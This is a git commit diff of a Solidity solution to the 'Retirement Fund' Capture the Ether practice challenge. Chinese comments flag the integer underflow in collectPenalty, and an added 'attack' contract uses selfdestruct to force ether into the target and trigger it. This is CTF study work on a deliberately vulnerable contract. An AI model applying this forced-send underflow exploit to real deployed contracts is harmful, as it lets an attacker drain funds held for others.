725e3799a44d45aa8af5cbfb4321d1fc808cee42
oh7887 <118185225+oh7887@users.noreply.github.com>
2023-03-22 11:57:59 +0800

    Update capture math3.sol

--- capture math3.sol
+++ capture math3.sol
@@ -1,22 +1,20 @@
 pragma solidity ^0.5.0;
 
 contract RetirementFundChallenge {
-    uint256 startBalance;
+    uint256 public startBalance;
     address owner = msg.sender;
-    address beneficiary;
-    uint256 expiration = now + 10;//now+10 years
-    //这里如果不改 会报错
+    address public beneficiary;
+    uint256 expiration = 10;
+    uint256 now=9;
     function retirementFundChallenge(address player) public payable {
         require(msg.value == 1 ether);
 
         beneficiary = player;
         startBalance = msg.value;
     }
-
     function isComplete() public view returns (bool) {
         return address(this).balance == 0;
     }
-
     function withdraw() public {
         require(msg.sender == owner);
 
@@ -27,16 +25,22 @@ contract RetirementFundChallenge {
             msg.sender.transfer(address(this).balance);
         }
     }
-
     function collectPenalty() public {
         require(msg.sender == beneficiary);
 
-        uint256 withdrawn = startBalance - address(this).balance;
+        uint256 withdrawn = startBalance - address(this).balance;//存在溢出漏洞
 
         // an early withdrawal occurred
-        require(withdrawn > 0);
+        require(withdrawn > 0);//只需要下溢
 
         // penalty is what's left
-        msg.sender.transfer(address(this).balance);
+        msg.sender.transfer(address(this).balance);//只需要使用另一种方法向合约转账
+    }
+}
+contract attack
+{
+    RetirementFundChallenge traget;
+    constructor(address payable add) public payable
+    {selfdestruct(add);//强制转账
     }
 }
